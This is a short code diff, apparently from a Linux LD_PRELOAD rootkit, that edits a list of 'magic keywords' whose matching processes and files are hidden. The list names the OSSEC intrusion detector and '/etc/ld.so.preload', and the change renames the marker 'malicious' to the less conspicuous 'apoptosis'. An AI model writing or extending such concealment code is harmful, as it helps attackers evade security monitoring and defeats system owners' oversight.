@@ -13,7 +13,7 @@
 
 // Magic keywords to hide - processes/files containing ANY of these will be hidden
 static const char *MAGIC_KEYWORDS[] = {
-    "malicious",
+    "apoptosis",
     "ossec",
     "hide_process",
     "/etc/ld.so.preload",
